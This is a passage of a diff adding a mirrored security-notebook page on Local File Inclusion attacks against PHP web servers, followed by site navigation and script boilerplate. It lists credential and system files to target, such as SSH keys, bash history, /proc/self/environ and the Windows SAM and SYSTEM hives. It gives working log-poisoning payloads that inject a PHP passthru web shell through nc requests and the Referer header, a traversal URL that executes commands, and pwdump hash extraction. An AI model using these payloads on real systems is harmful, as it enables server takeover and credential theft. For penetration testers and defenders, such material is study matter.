+config.php
+</code></pre><p><strong>SSH</strong></p>
+<pre><code>authorized_keys
+id_rsa
+id_rsa.keystore
+id_rsa.pub
+known_hosts
+</code></pre><p><strong>Logs</strong></p>
+<pre><code>/etc/httpd/logs/acces_log 
+/etc/httpd/logs/error_log 
+/var/www/logs/access_log 
+/var/www/logs/access.log 
+/usr/local/apache/logs/access_ log 
+/usr/local/apache/logs/access. log 
+/var/log/apache/access_log 
+/var/log/apache2/access_log 
+/var/log/apache/access.log 
+/var/log/apache2/access.log
+/var/log/access_log
+</code></pre><p><strong>User specific files</strong></p>
+<p>Found in the home-directory</p>
+<pre><code>.bash_history
+.mysql_history
+.my.cnf
+</code></pre><p><strong>Proc files</strong></p>
+<p>&quot;Under Linux, /proc includes a directory for each running process, including kernel processes, in directories named /proc/PID, where PID is the process number. Each directory contains information about one process, including: /proc/PID/cmdline, the command that originally started the process.&quot;</p>
+<p><a href="https://en.wikipedia.org/wiki/Procfs" target="_blank">https://en.wikipedia.org/wiki/Procfs</a></p>
+<p><a href="https://blog.netspi.com/directory-traversal-file-inclusion-proc-file-system/" target="_blank">https://blog.netspi.com/directory-traversal-file-inclusion-proc-file-system/</a></p>
+<pre><code>/proc/sched_debug # Can be used to see what processes the machine is running
+/proc/mounts
+/proc/net/arp
+/proc/net/route
+/proc/net/tcp
+/proc/net/udp
+/proc/net/fib_trie
+/proc/version
+/proc/self/environ
+</code></pre><h2 id="bruteforcing-ssh-knownhosts">Bruteforcing SSH known_hosts</h2>
+<p><a href="https://blog.rootshell.be/2010/11/03/bruteforcing-ssh-known_hosts-files/" target="_blank">https://blog.rootshell.be/2010/11/03/bruteforcing-ssh-known_hosts-files/</a></p>
+<h2 id="lfi-to-shell">LFI to shell</h2>
+<p>Under the right circumstances you might be able to get a shell from a LFI</p>
+<h3 id="log-poisoning">Log poisoning</h3>
+<p>There are some requirements. We need to be able to read log files. In this example we are going to poison the apache log file. You can use either the success.log or the error.log</p>
+<p>So once you have found a LFI vuln you have to inject php-code into the log file and then execute it.</p>
+<p><strong>Insert php-code into the log file</strong></p>
+<p>This can be done with nc or telnet.</p>
+<pre><code>nc 192.168.1.102 80
+GET /&lt;?php passthru($_GET[&apos;cmd&apos;]); ?&gt; HTTP/1.1
+Host: 192.168.1.102
+Connection: close
+</code></pre><p>You can also add it to the error-log by making a request to a page that doesn&apos;t exists</p>
+<pre><code>nc 192.168.1.102 80
+GET /AAAAAA&lt;?php passthru($_GET[&apos;cmd&apos;]); ?&gt; HTTP/1.1
+Host: 192.168.1.102
+Connection: close
+</code></pre><p>Or in the referer parameter.</p>
+<pre><code>GET / HTTP/1.1
+Referer: &lt;? passthru($_GET[cmd]) ?&gt;
+Host: 192.168.1.159
+Connection: close
+</code></pre><p><strong>Execute it in the browser</strong></p>
+<p>Now you can request the log-file through the LFI and see the php-code get executed. </p>
+<pre><code>http://192.168.1.102/index.php?page=../../../../../var/log/apache2/access.log&amp;cmd=id
+</code></pre><h3 id="proc-files">Proc files</h3>
+<p>If you can read the proc-files on the system you might be able to poison them through the user-agent.</p>
+<p>We can also inject code into /proc/self/environ through the user-agent</p>
+<p><a href="https://www.exploit-db.com/papers/12992/" target="_blank">https://www.exploit-db.com/papers/12992/</a></p>
+<p><a href="https://www.youtube.com/watch?v=ttTVNcPnsJY" target="_blank">https://www.youtube.com/watch?v=ttTVNcPnsJY</a></p>
+<h2 id="windows">Windows</h2>
+<p><strong>Fingerprinting</strong></p>
+<pre><code>c:\WINDOWS\system32\eula.txt
+c:\boot.ini  
+c:\WINDOWS\win.ini  
+c:\WINNT\win.ini  
+c:\WINDOWS\Repair\SAM  
+c:\WINDOWS\php.ini  
+c:\WINNT\php.ini  
+c:\Program Files\Apache Group\Apache\conf\httpd.conf  
+c:\Program Files\Apache Group\Apache2\conf\httpd.conf  
+c:\Program Files\xampp\apache\conf\httpd.conf  
+c:\php\php.ini  
+c:\php5\php.ini  
+c:\php4\php.ini  
+c:\apache\php\php.ini  
+c:\xampp\apache\bin\php.ini  
+c:\home2\bin\stable\apache\php.ini  
+c:\home\bin\stable\apache\php.ini
+</code></pre><p><strong>Logs</strong></p>
+<p>Common path for apache log files on windows:</p>
+<pre><code>c:\Program Files\Apache Group\Apache\logs\access.log  
+c:\Program Files\Apache Group\Apache\logs\error.log
+</code></pre><p><strong>PHP Session Locations</strong></p>
+<pre><code>c:\WINDOWS\TEMP\  
+c:\php\sessions\  
+c:\php5\sessions\  
+c:\php4\sessions\
+</code></pre><p><strong>Retrieving password hashes</strong></p>
+<p>In order to retrieve the systems password hashed we need two files: <strong>system</strong> and <strong>SAM</strong>. Once you have those two files you can extract the hased using the kali tool pwdump, like this:</p>
+<pre><code>pwdump systemfile samfile
+</code></pre><p>The system and SAM files can be found in different locations, so try them all. From a webserver the path might be case-sensitive, even though it is windows. So consider that!</p>
+<pre><code>Systemroot is usually windows
+windows\repair\SAM
+%SYSTEMROOT%\repair\SAM
+%SYSTEMROOT%\System32\config\RegBack\SAM
+%SYSTEMROOT%\System32\config\SAM
+
+
+%SYSTEMROOT%\repair\system
+%SYSTEMROOT%\System32\config\SYSTEM
+%SYSTEMROOT%\System32\config\RegBack\system
+</code></pre><h2 id="references">References:</h2>
+<p>This is the definitive guide to Local File inclusion<br><a href="https://highon.coffee/blog/lfi-cheat-sheet/" target="_blank">https://highon.coffee/blog/lfi-cheat-sheet/</a></p>
+<p>And this<br><a href="http://securityidiots.com/Web-Pentest/LFI" target="_blank">http://securityidiots.com/Web-Pentest/LFI</a></p>
+<p>And this:</p>
+<p><a href="https://websec.wordpress.com/2010/02/22/exploiting-php-file-inclusion-overview/" target="_blank">https://websec.wordpress.com/2010/02/22/exploiting-php-file-inclusion-overview/</a></p>
+<p><a href="https://nets.ec/File_Inclusion" target="_blank">https://nets.ec/File_Inclusion</a>  </p>
+<p><a href="https://gist.github.com/sckalath/da1a232f362a700ab459" target="_blank">https://gist.github.com/sckalath/da1a232f362a700ab459</a></p>
+
+                                
+                                </section>
+                            
+    </div>
+    <div class="search-results">
+        <div class="has-results">
+            
+            <h1 class="search-results-title"><span class='search-results-count'></span> results matching "<span class='search-query'></span>"</h1>
+            <ul class="search-results-list"></ul>
+            
+        </div>
+        <div class="no-results">
+            
+            <h1 class="search-results-title">No results matching "<span class='search-query'></span>"</h1>
+            
+        </div>
+    </div>
+</div>
+
+                        </div>
+                    </div>
+                
+            </div>
+
+            
+                
+                <a href="lead_to_compromise.html" class="navigation navigation-prev " aria-label="Previous page: Attacking the System">
+                    <i class="fa fa-angle-left"></i>
+                </a>
+                
+                
+                <a href="remote_file_inclusion.html" class="navigation navigation-next " aria-label="Next page: Remote File Inclusion">
+                    <i class="fa fa-angle-right"></i>
+                </a>
+                
+            
+        
+    </div>
+
+    <script>
+        var gitbook = gitbook || [];
+        gitbook.push(function() {
+            gitbook.page.hasChanged({"page":{"title":"Local File Inclusion","level":"1.4.2.7.1","depth":4,"next":{"title":"Remote File Inclusion","level":"1.4.2.7.2","depth":4,"path":"remote_file_inclusion.md","ref":"remote_file_inclusion.md","articles":[]},"previous":{"title":"Attacking the System","level":"1.4.2.7","depth":3,"path":"lead_to_compromise.md","ref":"lead_to_compromise.md","articles":[{"title":"Local File Inclusion","level":"1.4.2.7.1","depth":4,"path":"local_file_inclusion.md","ref":"local_file_inclusion.md","articles":[]},{"title":"Remote File Inclusion","level":"1.4.2.7.2","depth":4,"path":"remote_file_inclusion.md","ref":"remote_file_inclusion.md","articles":[]},{"title":"Directory Traversal Attack","level":"1.4.2.7.3","depth":4,"path":"directory-traversal-attack.md","ref":"directory-traversal-attack.md","articles":[]},{"title":"Hidden Files and Directories","level":"1.4.2.7.4","depth":4,"path":"web-scanning.md","ref":"web-scanning.md","articles":[]},{"title":"SQL-Injections","level":"1.4.2.7.5","depth":4,"path":"sql-injections.md","ref":"sql-injections.md","articles":[]},{"title":"Nosql-Injections","level":"1.4.2.7.6","depth":4,"path":"nosql-injections.md","ref":"nosql-injections.md","articles":[]},{"title":"XML External Entity Attack","level":"1.4.2.7.7","depth":4,"path":"xml_external_entity_attack.md","ref":"xml_external_entity_attack.md","articles":[]},{"title":"Bypass File Upload Filtering","level":"1.4.2.7.8","depth":4,"path":"bypass_image_upload.md","ref":"bypass_image_upload.md","articles":[]},{"title":"Exposed Version Control","level":"1.4.2.7.9","depth":4,"path":"exposed_version_control.md","ref":"exposed_version_control.md","articles":[]},{"title":"Directory Traversal Attack","level":"1.4.2.7.10","depth":4,"ref":"","articles":[]},{"title":"Host Header Attack","level":"1.4.2.7.11","depth":4,"path":"host-header-attack.md","ref":"host-header-attack.md","articles":[]},{"title":"Deserialization attacks","level":"1.4.2.7.12","depth":4,"path":"deserialization-attacks.md","ref":"deserialization-attacks.md","articles":[]}]},"dir":"ltr"},"config":{"plugins":["comment"],"styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"},"pluginsConfig":{"comment":{"highlightCommented":true},"highlight":{},"search":{},"lunr":{"maxIndexSize":1000000,"ignoreSpecialCharacters":false},"sharing":{"facebook":true,"twitter":true,"google":false,"weibo":false,"instapaper":false,"vk":false,"all":["facebook","google","twitter","weibo","instapaper"]},"fontsettings":{"theme":"white","family":"sans","size":2},"theme-default":{"styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"},"showLevel":false}},"github":"xapax/security","theme":"default","author":"Philip Linghammar","pdf":{"pageNumbers":true,"fontSize":16,"fontFamily":"Arial","paperSize":"a4","chapterMark":"pagebreak","pageBreaksBefore":"/","margin":{"right":62,"left":62,"top":56,"bottom":56}},"structure":{"langs":"LANGS.md","readme":"README.md","glossary":"GLOSSARY.md","summary":"SUMMARY.md"},"variables":{},"title":"Security - My notepad","language":"en","links":{"sidebar":{"Security - My notepad":"https://legacy.gitbook.com/book/xapax/security"},"gitbook":true},"gitbook":"*","description":"Stuff"},"file":{"path":"local_file_inclusion.md","mtime":"2018-05-19T06:44:47.000Z","type":"markdown"},"gitbook":{"version":"3.2.3","time":"2018-05-19T06:38:06.164Z"},"basePath":".","book":{"language":""}});
+        });
+    </script>
+</div>
+
+        
+    <script src="gitbook/gitbook.js"></script>
+    <script src="gitbook/theme.js"></script>
+    
+        
+        <script src="gitbook/gitbook-plugin-comment/plugin.js"></script>
+        
+    
+        
+        <script src="gitbook/gitbook-plugin-search/search-engine.js"></script>
+        
+    
+        
+        <script src="gitbook/gitbook-plugin-search/search.js"></script>
+        
+    
+        
+        <script src="gitbook/gitbook-plugin-lunr/lunr.min.js"></script>
+        
+    
+        
+        <script src="gitbook/gitbook-plugin-lunr/search-lunr.js"></script>
+        
+    
+        
+        <script src="gitbook/gitbook-plugin-sharing/buttons.js"></script>
+        
+    
+        
+        <script src="gitbook/gitbook-plugin-fontsettings/fontsettings.js"></script>
+        
+    
+
+    
+<div><script style="display: none;" type="application/javascript">
+  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+  })(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
+
+  ga('create', 'UA-57505611-7', 'auto', {name: 'microcdn'});
+  ga('microcdn.send', 'pageview');
+
+  var _cdn_prev_loc = window.location.pathname;
+  window.setInterval(function () {
+    if (window.location.pathname !== _cdn_prev_loc) {
+      _cdn_prev_loc = window.location.pathname;
+      ga('microcdn.send', 'pageview');
+    }
+  }, 100);
+
+</script></div>
+</body>
+
+<!-- Mirrored from xapax.gitbooks.io/security/local_file_inclusion.html by HTTrack Website Copier/3.x [XR&CO'2014], Wed, 26 Sep 2018 18:11:05 GMT -->
+</html>
+
